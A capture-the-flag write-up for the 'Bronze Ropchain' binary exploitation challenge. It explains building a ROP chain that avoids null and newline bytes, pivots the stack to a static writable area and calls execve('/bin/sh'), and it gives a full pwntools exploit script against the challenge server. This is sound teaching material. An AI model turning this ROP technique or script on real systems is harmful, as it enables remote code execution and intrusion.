# Bronze Ropchain
To solve this challenge, you have to know how `fgets function` read user data. 
`fgets function` read user data until it reaches **null byte** (0x00) or **new line** (0x0a)
so when we do `ROP`, we can't use any address that contains `null` or `new line`

Because this challenge compiled with static-linking, there are many gadgets that we can use.
I found `mov eax, 2 ; ret`, `inc eax ; ret`, `inc edi ; ret`, `inc esi ; ret`, `pop ecx ; pop ebx ; ret`, `pop esi ; pop edi ; ret`, `call large dword ptr gs:10h` (syscall)

Because there are no "/bin/sh" string in binary, we have to write this string at writable static address.
To know this address range, just run this binary at gdb and use `vmmap` command.
```
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 0x8048000  0x80d7000 r-xp    8f000 0      /home/bound7/Desktop/ctf/redpwn/bronze_ropchain/bronze_ropchain
 0x80d8000  0x80dc000 rw-p     4000 8f000  /home/bound7/Desktop/ctf/redpwn/bronze_ropchain/bronze_ropchain
 0x80dc000  0x80ff000 rw-p    23000 0      [heap]
0xf7ff9000 0xf7ffc000 r--p     3000 0      [vvar]
0xf7ffc000 0xf7ffe000 r-xp     2000 0      [vdso]
0xfffdd000 0xffffe000 rw-p    21000 0      [stack]
```
we can use **0x080d8000 ~ 0x080dc000** ( we can't use stack because of ASLR )
and I use fgets_greet_ret gadget which is part of main function to write '/bin/sh' string at this address range.

```
.text:0804895B                 add     esp, 10h
.text:0804895E                 mov     eax, offset stdin
.text:08048964                 mov     eax, [eax]
.text:08048966                 sub     esp, 4
.text:08048969                 push    eax
.text:0804896A                 push    400h
.text:0804896F                 lea     eax, [ebp+var_408]
.text:08048975                 push    eax
.text:08048976                 call    fgets
.text:0804897B                 add     esp, 10h
.text:0804897E                 sub     esp, 0Ch
.text:08048981                 lea     eax, [ebp+var_408]
.text:08048987                 push    eax
.text:08048988                 call    greet
.text:0804898D                 add     esp, 10h
.text:08048990                 mov     eax, 0
.text:08048995                 lea     esp, [ebp-8]
.text:08048998                 pop     ecx
.text:08048999                 pop     ebx
.text:0804899A                 pop     ebp
.text:0804899B                 lea     esp, [ecx-4]
.text:0804899E                 retn
```
because this gadget read data based on `ebp` register, i give static address to ebp register.
In details, this gadget write user input at `ebp-0x408` so i set `ebp` register to `target_addr+0x408`.
after use this gadget, we can write data which we know where it is. ( change stack to static address )

to exploit successfully, we have to use syscall.
To call successfull /bin/sh, the registers should be set as shown below.
```
eax <- 0xb                     ( sys_execve )
ebx <- 0x080d8108 <- '/bin/sh' ( arg1 )
ecx <- 0x080d8140 <- 0x0       ( arg2 )
edx <- 0x0                     ( arg3 )
edi <- 0x080da000 <- 0         ( global_offset_table )
esi <- 0x080da000 <- 0         ( global_offset_table )
```
`eax` ->`mov eax, 2 ; ret` and `inc eax ; ret`.
`ebx` and `ecx` -> `pop ecx ; pop ebx ; ret`.
`edx` -> use `getchar()` in `greet` function. just send '\x00'.
`edi` and `esi` -> `pop esi ; ret`, `pop edi ; ret`, `inc esi ; ret`, `inc edi ; ret`
because the address of `global_offset_table` starts with `null`, we can't directly give this address.
so pop `global_offset_table-0x1` and increase `esi` and `edi` register to bypass this restriction.

# Full Exploit Code
```
from pwn import *

#p = process('./bronze_ropchain')
p = remote('chall2.2019.redpwn.net', 4004)
t = 0.05

syscall = 0x0806dd22
fgets_strcpy = 0x0804895b

pop_ecx_ebx_ret = 0x0806ef52
pop_esi_edi_ret = 0x08049b2a
inc_eax_ret = 0x0807c3b9
inc_esi_ret = 0x08052be6
inc_edi_ret = 0x08049ce4
mov_eax_2_ret = 0x08092db0

binsh = 0x080d80a0
global_offset_table = 0x080da000

payload = ''
payload += 'a'*0x18
payload += p32(binsh+0x408)
payload += p32(fgets_strcpy)

p.sendline(payload)
sleep(t)
p.send('\x00')
sleep(t)

'''
pop ecx
pop ebx

mov eax, 2
inc eax X 9

pop esi
pop edi
inc esi
inc edi
call large dword ptr gs:10h

eax <- 0xb                     ( sys_execve )
ebx <- 0x080d8108 <- '/bin/sh' ( arg1 )
ecx <- 0x080d8140 <- 0x0       ( arg2 )
edx <- 0x0                     ( arg3 )
edi <- 0x080da000 <- 0         ( global_offset_table )
esi <- 0x080da000 <- 0         ( global_offset_table )
'''

payload = ''
payload += 'a'*0x18 # dummy
payload += 'aaaa' # ebp
payload += p32(pop_ecx_ebx_ret)
payload += p32(binsh+0xa0) # address that point null byte
payload += p32(binsh+0x68) # address that point /bin/sh\x00 string
payload += p32(mov_eax_2_ret)
for i in range(9):
	payload += p32(inc_eax_ret)

payload += p32(pop_esi_edi_ret)
payload += p32(global_offset_table-0x1) # bypass null byte
payload += p32(global_offset_table-0x1) # bypass null byte
payload += p32(inc_esi_ret)
payload += p32(inc_edi_ret)
payload += p32(syscall)
payload += '/bin/sh\x00'

p.sendline(payload)
sleep(t)

p.send('\x00') # set edx 0x0

p.interactive()
```
